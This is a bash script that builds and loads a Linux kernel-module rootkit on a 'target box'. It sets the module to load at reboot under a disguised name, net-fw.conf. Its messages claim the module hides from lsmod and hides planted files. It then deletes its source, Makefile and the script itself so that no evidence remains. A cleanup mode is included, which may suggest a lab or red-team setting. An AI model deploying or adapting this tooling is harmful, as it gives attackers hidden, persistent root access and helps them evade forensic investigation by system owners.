#!/usr/bin/env bash
# Compile and load the rootkit LKM on the target box.
# Requires: kernel-devel / linux-headers for the running kernel.
# Rocky 9:  dnf install -y kernel-devel-$(uname -r)
# Ubuntu:   apt-get install -y linux-headers-$(uname -r)
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

KVER="$(uname -r)"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

case "${1:-deploy}" in
  deploy)
    echo "[*] Building LKM for kernel ${KVER}..."
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    make -C "$DIR" KVER="$KVER"

    echo "[*] Loading module..."
    insmod "${DIR}/rootkit.ko"

    # Auto-load on reboot
    EXTRA_DIR="/lib/modules/${KVER}/extra"
    mkdir -p "$EXTRA_DIR"
    cp "${DIR}/rootkit.ko" "${EXTRA_DIR}/rootkit.ko"
    depmod -a 2>/dev/null || true
    echo "rootkit" > /etc/modules-load.d/net-fw.conf

    echo "[+] lkm/load: rootkit loaded (hidden from lsmod)"
    echo "[+]   Hides: files starting with .def_ and our planted filenames"
    echo "[+]   Auto-load on reboot: /etc/modules-load.d/net-fw.conf"
    # Wipe source and build artifacts — no evidence of what was compiled
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    rm -f "${DIR}/rootkit.c" "${DIR}/Makefile"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    rmmod rootkit 2>/dev/null || echo "[!] rmmod failed — may be hidden; try: rmmod rootkit after manual lsmod"
    rm -f "/lib/modules/${KVER}/extra/rootkit.ko"
    rm -f /etc/modules-load.d/net-fw.conf
    depmod -a 2>/dev/null || true
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    echo "[-] lkm/load: rootkit unloaded"
    ;;
  *) echo "Usage: $0 [deploy|cleanup]"; exit 1 ;;
esac
